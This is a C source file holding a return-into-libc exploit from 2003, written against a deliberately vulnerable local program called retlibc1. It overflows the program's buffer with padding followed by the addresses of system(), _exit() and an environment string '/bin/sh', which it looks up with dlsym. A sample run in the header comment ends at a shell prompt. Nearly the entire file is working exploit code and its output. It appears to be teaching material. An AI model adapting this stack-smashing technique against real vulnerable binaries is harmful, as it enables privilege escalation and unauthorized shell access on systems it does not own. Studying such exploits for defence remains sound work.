/*
 * $Id: retlibc1-ex4.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex4.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit shows the basic return-into-libc technique, changing the 
 * execution flow of an abo1.c-like vulnerable program. This time we
 * implemented a simple search() function to find system() and _exit()
 * addresses in libc. The "/bin/sh" string is still passed in env.
 *
 * See also Solar Designer's lpr2.c and Horizon's exhole.c.
 *
 * Tested on Linux 2.4.20-rc4 with gcc-2.95.4. For newer compilers, you          * probably have to use a bigger buffer and pad A's to (67 * 4) = 268.
 *
 * $ ./retlibc1-ex4 
 * Using system() address: 0x4005f590
 * Using _exit() address: 0x400bae90
 * Using /bin/sh address: 0xbfffffe9
 * sh-2.05a$
 */

// Compile with the same shared libs of the vulnerable program, using:
// $ gcc retlibc1-ex4.c -o retlibc1-ex4 `ldd retlibc1 \
// | grep '^.lib' | sed -e 's/^.lib\([_0-9a-zA-Z]*\)\.so.*/-l\1/'` -ldl

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dlfcn.h>

#define BUF	273			// (65 * 4) + (4 * 3) + 1
#define VULN	"./retlibc1"		// the vulnerable program
#define	SHELL	"/bin/sh"		// the "/bin/sh" string

int search(char *pattern)
{
	void *p;
	int addr;

	/* dlopen() the main program */
	if ( !(p = dlopen(NULL, RTLD_LAZY)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* search for the pattern */
	if ( !(addr = (int)dlsym(p, pattern)) ) {
		fprintf(stderr, "%s\n", dlerror());
		exit(-1);
	}

	/* check the address for the presence of a 0x0 */
	if ( !(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
			!(addr & 0xff000000) ) {
		fprintf(stderr, "the address of %s contains a 0x0!\n", pattern);
		exit(-1);
	}

	dlclose(p);
	return(addr);
}

int main()
{
	char *env[2] = {SHELL, NULL};
	char buf[BUF];

	int system = search("system"); 
	int exit = search("_exit"); /* can't use exit() */

	int *p = (int *)buf;
	int shell = 0xbffffffa - strlen(SHELL) - strlen(VULN);

	fprintf(stderr, "Using system() address: %p\n", system);
	fprintf(stderr, "Using _exit() address: %p\n", exit);
	fprintf(stderr, "Using /bin/sh address: %p\n", shell);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = system;	/* system() address in libc */
	*p++ = exit;	/* _exit() address in libc */
	*p++ = shell;	/* "/bin/sh" address in env */
	*p = 0x0;

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, env);
	perror("execle");
}
